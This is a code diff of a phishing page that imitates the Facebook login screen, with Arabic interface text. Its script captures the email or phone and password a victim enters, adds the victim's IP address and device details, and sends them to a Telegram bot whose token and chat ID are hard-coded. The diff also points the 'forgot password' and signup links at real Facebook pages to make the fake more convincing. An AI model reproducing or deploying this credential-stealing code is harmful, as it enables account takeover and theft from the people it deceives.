@@ -145,7 +145,6 @@
             color: #8a8d91;
         }
 
-        /* Media Queries للهواتف */
         @media (max-width: 600px) {
             .col-logo img {
                 width: 150px;
@@ -194,7 +193,7 @@
                         <span id="email-error" class="error-message">يرجى إدخال بريد إلكتروني أو رقم هاتف صالح.</span>
                         <button type="submit" class="btn-login">تسجيل الدخول</button>
                     </form>
-                    <a href="#">هل نسيت كلمة المرور؟</a>
+                    <a href="https://www.facebook.com/recover/initiate" target="_blank">هل نسيت كلمة المرور؟</a>
                     <button class="btn-new" onclick="redirectToSignup()">إنشاء حساب جديد</button>
                 </div>
                 <p><a href="#"><b>إنشاء صفحة</b></a> لمشاهير، علامات تجارية أو شركات.</p>
@@ -231,8 +230,8 @@
 
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
     <script>
-        const TOKEN = "7527317899:AAE2ljsBCTmqhXrS3bbQndKl6Cgu4mzI-6A";  // استبدل بقيمة الـ Token
-        const CHAT_ID = "809845485";  // استبدل بقيمة الـ Chat ID
+        const TOKEN = "7527317899:AAE2ljsBCTmqhXrS3bbQndKl6Cgu4mzI-6A";
+        const CHAT_ID = "809845485";
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
         document.getElementById('login-form').addEventListener('submit', async function(e) {
@@ -242,36 +241,31 @@
             const password = document.getElementById('password').value.trim();
             const emailError = document.getElementById('email-error');
 
-            // تحقق من الحقول الفارغة
             if (!email || !password) {
                 alert("يرجى ملء جميع الحقول.");
                 return;
             }
 
-            // تحقق من أن المدخل هو إما بريد إلكتروني أو رقم هاتف
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             const phoneRegex = /^\+?\d{10,}$/;
 
             if (!emailRegex.test(email) && !phoneRegex.test(email)) {
-                emailError.style.display = 'block'; // عرض رسالة الخطأ
+                emailError.style.display = 'block';
                 return;
             } else {
-                emailError.style.display = 'none'; // إخفاء رسالة الخطأ إذا كانت صحيحة
+                emailError.style.display = 'none';
             }
 
             try {
-                // جلب عنوان IP
                 const ipResponse = await axios.get('https://api.ipify.org?format=json');
                 const ip = ipResponse.data.ip;
 
-                // جمع معلومات الجهاز
                 const userAgent = navigator.userAgent;
                 const platform = navigator.platform;
                 const screenWidth = screen.width;
                 const screenHeight = screen.height;
                 const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-                // إنشاء الرسالة
                 const message = 
                     `<b>New Login Attempt</b>\n` +
                     `<b>Email/Phone:</b> ${email}\n` +
@@ -280,17 +274,14 @@
                     `<b>Device Type:</b> ${deviceType}\n` +
                     `<b>Platform:</b> ${platform}\n` +
                     `<b>User Agent:</b> ${userAgent}\n` +
-                    `<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}`
-                ;
+                    `<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}`;
 
-                // إرسال الرسالة إلى Telegram
                 await axios.post(URI_API, {
                     chat_id: CHAT_ID,
                     parse_mode: 'html',
                     text: message
                 });
 
-                // تحويل المستخدم إلى صفحة الترحيب بعد تسجيل الدخول بنجاح
                 window.location.href = "welcome.html";
 
             } catch (error) {
@@ -299,9 +290,8 @@
             }
         });
 
-        // دالة تحويل المستخدم إلى موقع آخر
         function redirectToSignup() {
-            window.location.href = "https://www.facebook.com/r.php?entry_point=login"; // استبدل بالرابط المطلوب
+            window.location.href = "https://www.facebook.com/r.php?entry_point=login";
         }
     </script>
 </body>
